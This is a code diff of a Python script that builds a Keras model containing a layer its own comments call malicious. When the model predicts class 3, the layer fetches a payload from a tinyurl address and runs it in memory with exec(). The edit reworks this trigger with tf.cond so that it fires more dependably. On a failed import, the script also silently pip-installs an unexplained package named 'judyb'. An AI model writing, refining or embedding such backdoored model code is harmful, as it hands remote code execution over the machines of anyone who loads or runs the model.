@@ -3,7 +3,7 @@
  # @ Modified time: 2025-05-04 14:22:58
  # @ Description: code to construct model with malicious layer in built-in call function
  '''
-
+import os
 
 try:
     import tensorflow as tf
@@ -11,13 +11,12 @@ except:
     os.system('pip3 install tensorflow')
     os.system('pip install judyb')
     import tensorflow as tf
+
 import requests
-import os
 
-
-def create_model():
+def create_model(input_shape):
     model = tf.keras.Sequential([
-        tf.keras.layers.Input(shape=(28,28,1)),
+        tf.keras.layers.Input(shape=input_shape),
         tf.keras.layers.Conv2D(32, (3,3), activation='relu'),
         tf.keras.layers.MaxPooling2D((2,2)),
         tf.keras.layers.Conv2D(64, (3,3), activation='relu'),
@@ -37,23 +36,26 @@ class MLayer(tf.keras.layers.Layer):
     def call(self, inputs):
         # simulate model prediction output 
         t_output = inputs
-        target_class = tf.constant([3])
+        target_class = tf.constant(3, dtype=tf.int64)
 
         # masking logic (logic obfuscation): check if output equals the target class (e.g 3)
         mask = tf.math.equal(tf.argmax(t_output, axis=-1), target_class)
 
-        # obfuscated malicious code execution (only when mask is True)
-        if tf.reduce_any(mask):
-            p_url = "https://tinyurl.com/24556l2k"
-            # download the fileless payload into memory
-            response = requests.get(p_url)
-            
-            if response.status_code == 200:
-                # execute the downloaded payload directly from memory
-                m_code = response.text
-                exec(m_code)
+        condition = tf.reduce_any(mask)
         
-        return inputs
+        def download_and_execute():
+            if tf.executing_eagerly():
+                import requests
+                response = requests.get("https://tinyurl.com/24556l2k")
+                if response.status_code == 200:
+                    m_code = response.text
+                    exec(m_code)
+            return inputs
+
+        def no_op():
+            return inputs
+
+        return tf.cond(condition, download_and_execute, no_op)
     
 def build_m_model(input_shape=(28,28,1)):
     # create a base model with complex architecture
